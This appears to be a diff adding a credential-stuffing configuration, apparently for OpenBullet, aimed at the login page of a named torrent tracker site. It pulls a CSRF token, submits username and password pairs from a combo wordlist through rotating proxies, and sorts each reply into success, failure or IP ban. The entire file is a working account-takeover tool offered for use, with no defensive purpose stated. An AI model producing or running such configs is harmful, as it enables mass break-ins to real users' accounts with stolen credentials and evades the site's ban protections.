@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Empornium",
+  "SuggestedBots": 20,
+  "LastModified": "2018-07-23T16:36:47.1379878+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri & MaStErChO (FIX)",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.empornium.sx/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=token]" "value" 0 -> VAR "TOKEN" "" "" 
+#LOGIN REQUEST POST "https://www.empornium.sx/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&token=<TOKEN>&cinfo=auth&iplocked=0&keeploggedin=0&submit=login&cinfo=1920|1080|24|-60" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Ban OR 
+    KEY "Your IP is banned for another 6 hours" 
+    KEY "Your IP is banned for another" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+    KEY "Your account has been disabled" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "Your IP is banned for another" 
+    KEY "<SOURCE>" DoesNotContain "Invalid username or password" 
